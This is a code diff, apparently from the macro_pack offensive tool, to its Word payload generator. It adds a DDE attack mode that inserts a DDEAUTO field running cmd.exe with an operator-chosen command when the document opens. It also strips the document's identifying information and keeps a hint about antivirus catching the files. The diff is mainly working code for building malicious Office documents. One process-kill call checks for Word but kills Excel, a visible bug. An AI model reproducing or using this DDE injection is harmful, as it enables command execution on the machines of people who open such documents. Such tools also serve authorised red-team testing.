@@ -11,7 +11,9 @@ if sys.platform == "win32":
     import winreg # @UnresolvedImport
 
 import logging
+from common import utils
 from modules.vba_gen import VBAGenerator
+from collections import OrderedDict
 
 
 
@@ -59,6 +61,12 @@ class WordGenerator(VBAGenerator):
         
     def check(self):
         logging.info("   [-] Check feasibility...")
+        if utils.checkIfProcessRunning("winword.exe"):
+            logging.error("   [!] Cannot generate Word payload if Word is already running.")
+            if utils.yesOrNo(" Do you want macro_pack to kill Word process? "):
+                utils.forceProcessKill("Excel.exe")
+            else:
+                return False
         try:
             objWord = win32com.client.Dispatch("Word.Application")
             objWord.Application.Quit()
@@ -69,7 +77,39 @@ class WordGenerator(VBAGenerator):
         return True
 
 
+        
+    def insertDDE(self):
+        logging.info(" [+] Include DDE attack...")
+        # Get command line
+        paramDict = OrderedDict([("Cmd_Line",None)])      
+        self.fillInputParams(paramDict)
+        command = paramDict["Cmd_Line"]
 
+        logging.info("   [-] Open document...")
+        # open up an instance of Word with the win32com driver
+        word = win32com.client.Dispatch("Word.Application")
+        # do the operation in background without actually opening Excel
+        word.Visible = False
+        document = word.Documents.Open(self.outputFilePath)
+
+        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
+        
+        ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
+        wdFieldDDEAuto=46
+        document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
+        
+        # save the document and close
+        word.DisplayAlerts=False
+        # Remove Informations
+        logging.info("   [-] Remove hidden data and personal info...")
+        wdRDIAll=99
+        document.RemoveDocumentInformation(wdRDIAll)
+        logging.info("   [-] Save Document...")
+        document.Save()
+        document.Close()
+        word.Application.Quit()
+        # garbage collection
+        del word
 
 
     def generate(self):
@@ -98,6 +138,7 @@ class WordGenerator(VBAGenerator):
             logging.info("   [-] Inject VBA...")
             # Read generated files
             for vbaFile in self.getVBAFiles():
+                logging.debug("     -> File %s" % vbaFile)
                 if vbaFile == self.getMainVBAFile():       
                     with open (vbaFile, "r") as f:
                         # Add the main macro- into ThisDocument part of Word document
@@ -131,15 +172,21 @@ class WordGenerator(VBAGenerator):
             # garbage collection
             del word
             self.disableVbom()
+            
+            if self.mpSession.ddeMode: # DDE Attack mode
+                self.insertDDE()
     
             logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
-            logging.info("   [-] Test with : \nmacro_pack.exe --run %s\n" % self.outputFilePath)
+            logging.info("   [-] Test with : \n%s --run %s\n" % (utils.getRunningApp(),self.outputFilePath))
         except Exception:
             logging.exception(" [!] Exception caught!")
             logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
             logging.error(" [!] Attempt to force close MS Word...")
             objWord = win32com.client.Dispatch("Word.Application")
             objWord.Application.Quit()
+            # If it Application.Quit() was not enough we force kill the process
+            if utils.checkIfProcessRunning("winword.exe"):
+                utils.forceProcessKill("winword.exe")
             del objWord
 
         
